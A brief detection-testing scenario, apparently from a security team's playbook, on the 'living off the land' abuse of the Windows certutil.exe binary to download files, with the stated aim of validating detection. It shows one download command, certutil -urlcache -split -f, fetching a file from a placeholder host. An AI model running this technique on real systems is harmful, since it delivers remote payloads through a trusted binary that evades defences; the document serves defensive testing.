# Living off the Land – Certutil

## Summary

This scenario documents the use of `certutil.exe`, a legitimate Windows binary that can be abused to download files.

---

## Objective

To validate detection of suspicious use of built-in Windows tools.

---

## Command Observed

```cmd
certutil -urlcache -split -f http://example.com file.txt
